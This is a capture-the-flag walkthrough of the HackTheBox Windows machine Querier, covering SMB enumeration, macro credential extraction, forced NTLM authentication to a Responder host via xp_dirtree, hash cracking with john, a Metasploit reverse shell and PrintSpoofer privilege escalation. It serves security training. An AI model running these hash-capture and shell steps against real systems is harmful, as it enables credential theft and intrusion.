---
title: "HackTheBox - Querier"
author: Nasrallah
description: ""
date: 2023-04-13 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, windows, easy]
img_path: /assets/img/hackthebox/machines/querier
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---


## **Description**

Hello hackers, I hope you are doing well. We are doing [Querier](https://app.hackthebox.com/machines/) from [HackTheBox](https://www.hackthebox.com).

![](0.png)

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.10.125                                                                                                                             
Host is up (0.28s latency).                                                                                                                                   
                                                                                                                                                              
PORT      STATE SERVICE       VERSION                                                                                                                         
135/tcp   open  msrpc         Microsoft Windows RPC                                                                                                           
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn                                                                                                   
445/tcp   open  microsoft-ds?                                                                                                                                 
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM                                                                                    
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-04-07T10:31:35 
|_Not valid after:  2053-04-07T10:31:35 
|_ssl-date: 2023-04-07T11:13:21+00:00; 0s from scanner time.
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-04-07T11:13:11
|_  start_date: N/A
```

We have an SMB server, MSSQL on port 1433 and winrm on port 5985.

### SMB

Let's list shares of the SMB server.

```terminal
$ smbclient -L 10.10.10.125 -N                                                                                                                     130 ⨯

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Reports         Disk      
SMB1 disabled -- no workgroup available

```

found share called `Reports`, let's connect to it.

```terminal
$ smbclient //10.10.10.125/Reports -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jan 29 00:23:48 2019
  ..                                  D        0  Tue Jan 29 00:23:48 2019
  Currency Volume Report.xlsm         A    12229  Sun Jan 27 23:21:34 2019

                5158399 blocks of size 4096. 841083 blocks available
smb: \> get "Currency Volume Report.xlsm"
getting file \Currency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm (12.0 KiloBytes/sec) (average 12.0 KiloBytes/sec)
```

We found an excel file.

When opening the file we get warned there are Macros.

We can extract the macros using `olevba`.

```terminal
$ olevba Currency\ Volume\ Report.xlsm                                                                                                                   
olevba 0.60.1 on Python 3.9.2 - http://decalage.info/python/oletools                                                                                          
===============================================================================                                                                               
FILE: Currency Volume Report.xlsm                                                                                                                             
Type: OpenXML                                                                                                                                                 
WARNING  For now, VBA stomping cannot be detected for files in memory                                                                                         
-------------------------------------------------------------------------------                                                                               
VBA MACRO ThisWorkbook.cls                                                                                                                                    
in file: xl/vbaProject.bin - OLE stream: 'VBA/ThisWorkbook'                                                                                                   
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -                                                                                 
                                                                                                                                                              
' macro to pull data for client volume reports                                                                                                                
'                                                                                                                                                             
' further testing required                                                                                                                                    
                                                                                                                                                              
Private Sub Connect()                                                                                                                                         
                                                                                                                                                              
Dim conn As ADODB.Connection                                                                                                                                  
Dim rs As ADODB.Recordset                                                                                                                                     

Set conn = New ADODB.Connection
conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6"
conn.ConnectionTimeout = 10
conn.Open

If conn.State = adStateOpen Then

  ' MsgBox "connection successful"
  
  'Set rs = conn.Execute("SELECT * @@version;")
  Set rs = conn.Execute("SELECT * FROM volume;")
  Sheets(1).Range("A1").CopyFromRecordset rs
  rs.Close

End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
```

We found the username `reporting` and password `PcwTWTHRwryjc$c6`.

## **Foothold**

Let's use the credentials to login using `mssqlclient` from Impacket

```terminal
$ mssqlclient.py reporting:'PcwTWTHRwryjc$c6'@10.10.10.125 -windows-auth                                                                             130 ⨯
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation                      
                                                                              
[*] Encryption required, switching to TLS                                                                                                                    
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)        
[!] Press help for extra shell commands                         
SQL>
```

Nothing interesting comes out from the databases.

We can use `xp_dirtree` command to get it to connect to an SMB server we control with `responder`, and with that we can capture the NetNTLM hash.

First we run `responder`.

```terminal
$ sudo responder -I tun0                                                                                                                          [28/30]                                                                                                                                   
                                         __                                                                                                                   
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.                                                                                                      
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|                                                                                                      
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|                                                                                                        
                   |__|                                                                                                                                       
                                                                                                                                                              
           NBT-NS, LLMNR & MDNS Responder 3.0.6.0                                                                                                             
                                                                                                                                                              
  Author: Laurent Gaffie (laurent.gaffie@gmail.com)                                                                                                           
  To kill this script hit CTRL-C                                                                                                                              
                                                                                                                                                              
                                                                                                                                                              
[+] Poisoners:                                                                                                                                                
    LLMNR                      [ON]                                                                                                                           
    NBT-NS                     [ON]                                                                                                                           
    DNS/MDNS                   [ON]                                                                                                                           
                                                                                                                                                              
[+] Servers:                                                                                                                                                  
    HTTP server                [ON]                                                                                                                           
    HTTPS server               [ON]                                                                                                                           
    WPAD proxy                 [OFF]                                                                                                                          
    Auth proxy                 [OFF]                                                                                                                          
    SMB server                 [ON]                                                                                                                           
    Kerberos server            [ON]                                                                                                                           
    SQL server                 [ON]                                                                                                                           
    FTP server                 [ON]                                                                                                                           
    IMAP server                [ON]                                                                                                                           
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.17.90]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-393C6KEZ4VY]
    Responder Domain Name      [QQNL.LOCAL]
    Responder DCE-RPC Port     [47560]

[+] Listening for events...

```

Now we run the following command on the SQL server

```terminal
SQL> 'xp_dirtree \\10.10.17.90\asdf';
```

On responder we see that we've successfully got a hash for user `QUERIER\mssql-svc`.

```terminal
[SMB] NTLMv2-SSP Client   : 10.10.10.125
[SMB] NTLMv2-SSP Username : QUERIER\mssql-svc
[SMB] NTLMv2-SSP Hash     : mssql-svc::QUERIER:9a48d90addffd26b:0D66BC518F8ACB667C791D58EA6AE6C4:010100000000000080513A816069D901BB3671FB417D04D90000000002000800380056005700500001001E00570049004E002D0035005A0050004F004B00430054005900470046004D0004003400570049004E002D0035005A0050004F004B00430054005900470046004D002E0038005600570050002E004C004F00430041004C000300140038005600570050002E004C004F00430041004C000500140038005600570050002E004C004F00430041004C000700080080513A816069D90106000400020000000800300030000000000000000000000000300000B68014B705CA8BEA72454CA147AD20C6E6E6ADF82D8141308DE3F34752ACDD6F0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310037002E0039003000000000000000000000000000
```

### John

Let's use john and crack the hash.

```terminal
$ john -w=/usr/share/wordlists/rockyou.txt mssql.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
corporate568     (mssql-svc)
1g 0:00:00:08 DONE (2023-04-07 22:28) 0.1124g/s 1007Kp/s 1007Kc/s 1007KC/s correforenz..cornamuckla
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```

### Metasploit

Now we can use the metasploit module `exploit/windows/mssql/mssql_payload` to get a shell on the target.

```terminal
[msf](Jobs:0 Agents:0) exploit(windows/mssql/mssql_payload) >> exploit

[*] Started reverse TCP handler on 10.10.17.90:4444 
[*] 10.10.10.125:1433 - Command Stager progress -  12.47% done (1499/12022 bytes)
[*] 10.10.10.125:1433 - Command Stager progress -  24.94% done (2998/12022 bytes)
[*] 10.10.10.125:1433 - Command Stager progress -  37.41% done (4497/12022 bytes)
[*] 10.10.10.125:1433 - Command Stager progress -  49.88% done (5996/12022 bytes)
[*] 10.10.10.125:1433 - Command Stager progress -  62.34% done (7495/12022 bytes)
[*] 10.10.10.125:1433 - Command Stager progress -  74.81% done (8994/12022 bytes)
[*] 10.10.10.125:1433 - Command Stager progress -  86.86% done (10442/12022 bytes)
[*] 10.10.10.125:1433 - Command Stager progress -  99.13% done (11917/12022 bytes)
[*] 10.10.10.125:1433 - Command Stager progress - 100.00% done (12022/12022 bytes)
[*] Sending stage (200774 bytes) to 10.10.10.125
[*] Meterpreter session 1 opened (10.10.17.90:4444 -> 10.10.10.125:49679) at 2023-04-07 22:52:37 +0000

(Meterpreter 1)(C:\Windows\system32) > getuid
Server username: QUERIER\mssql-svc
```

## **Privilege Escalation**

### Winpeas

I run winpeas and managed to find the Administrator's password.

![](2.png)

With that password we can use `evil-winrm` to authenticate to the target as administrator via `winrm`

![](3.png)

### PrintSpoofer

Checking our privileges as `mssql-svc` we see we have `SeImpersonatePrivilege`

```terminal
whoami /priv                                                                                                                                                  
                                                                                                                                                              
PRIVILEGES INFORMATION                                                                                                                                        
----------------------                                                                                                                                        
                                                                                                                                                              
Privilege Name                Description                               State                                                                                 
============================= ========================================= ========                                                                              
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled                                                                              
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled                                                                              
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled                                                                               
SeImpersonatePrivilege        Impersonate a client after authentication Enabled                                                                               
SeCreateGlobalPrivilege       Create global objects                     Enabled                                                                               
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled                                                                              
                                                                                    
```

Since this is windows server 2019, the `JuicyPotato` attack won't work, but `PrintSpoofer` does work

![](1.png)

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).